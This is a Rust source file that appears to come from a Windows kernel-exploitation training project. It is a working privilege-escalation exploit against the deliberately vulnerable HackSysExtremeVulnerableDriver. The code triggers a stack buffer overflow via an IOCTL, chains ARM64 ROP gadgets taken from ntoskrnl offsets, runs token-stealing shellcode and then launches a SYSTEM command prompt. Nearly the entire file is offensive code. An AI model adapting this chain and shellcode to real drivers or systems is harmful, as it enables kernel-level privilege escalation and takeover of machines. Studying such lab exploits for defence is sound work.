use core::ffi::c_void;
use std::iter;

use win_kexp::shellcode::token_stealing_shellcode;
use win_kexp::util::bytes_to_hex_string;
use win_kexp::win32k::{
    allocate_shellcode, close_handle, create_cmd_process, get_device_handle, get_ntoskrnl_base,
    io_device_control, FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN, METHOD_NEITHER,
};
use win_kexp::{CTL_CODE, IOCTL};

const HEVD_IOCTL_BUFFER_OVERFLOW_STACK: u32 = IOCTL!(0x800);

macro_rules! create_rop_chain {
    ($base:expr, $($value:expr),+ $(,)?) => {{
        let mut chain = Vec::new();
        chain.extend(iter::repeat(0x41u8).take($base));
        $(
            chain.extend($value.to_le_bytes().iter().cloned());
        )*
        chain
    }};
}

fn exploit_stack_buffer_overflow_token_stealing() {
    let device_path = r"\\.\HackSysExtremeVulnerableDriver\0";

    println!("[+] Getting device handle {device_path}...");

    let h_device = get_device_handle(device_path);

    println!("[+] Successfully opened device handle.");

    println!("[+] Building payload...");
    let shellcode = token_stealing_shellcode();
    let (payload, payload_len) = allocate_shellcode(shellcode.as_ptr(), shellcode.len());

    let payload_address = payload as u64;
    let bytes = bytes_to_hex_string(payload, payload_len);

    println!("\t[*] Payload address: 0x{payload_address:x}");
    println!("\t[*] Payload: 0x{bytes}");

    let ret_overwrite_offset = 0x828;

    let ntoskrnl_base = get_ntoskrnl_base().expect("[-] Failed to get ntoskrnl base");
    let ntoskrnl_base_address = ntoskrnl_base as u64;

    println!("[+] Ntoskrnl base: 0x{ntoskrnl_base_address:x}");
    let gadget0 = ntoskrnl_base_address + 0x23b1cc; // ldr x0, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; hint #0x1f ; ret  ; (1 found)
    let gadget1 = ntoskrnl_base_address + 0xa21c28; // ldp x29, x30, [sp], #0x10 ; br x2 ; (1 found)
    let gadget2 = ntoskrnl_base_address + 0x20b1a4; // ldp x2, x3, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret  ; (1 found)
    let gadget3 = ntoskrnl_base_address + 0x23436c; // add sp, sp, #0x10 ; ldp x29, x30, [sp], #0x10 ; hint #0x1f ; ret  ; (1 found)
    let mi_get_pte_address = ntoskrnl_base_address + 0x3b0780;

    // 0x14039edbc: mov x2, x3 ; mov x0, x2 ; ldp x29, x30, [sp], #0x20 ; hint #0x1f ; ret  ; (1 found)
    // 0x1409eb088: add sp, sp, #0x10 ; ldp x29, x30, [sp], #0x20 ; hint #0x1f ; ret  ; (1 found)

    let user_buffer = create_rop_chain!(
        ret_overwrite_offset,
        gadget0,
        0x4242424242424242u64, // fp gets 4242424242424242
        gadget3, // lr gets gadget2
        payload_address, // x0 gets payload_address
        gadget2,
        mi_get_pte_address,
        gadget3,
        0x4343434343434343u64, // fp gets 4343434343434343
    );

    println!("[+] Triggering stack buffer overflow...");

    let user_buffer_address = user_buffer.as_ptr() as *mut c_void;
    let user_buffer_address_hex = user_buffer_address as u64;
    println!("\t[*] Address of user buffer: 0x{user_buffer_address_hex:x}");

    io_device_control(
        h_device,
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,
        user_buffer_address,
        user_buffer.len().try_into().unwrap(),
    );

    close_handle(h_device);

    println!("[+] Successfully closed device handle.");

    let pi = create_cmd_process();

    println!("[+] Process created with ID: {}", pi.dwProcessId);
}

fn main() {
    exploit_stack_buffer_overflow_token_stealing();
}
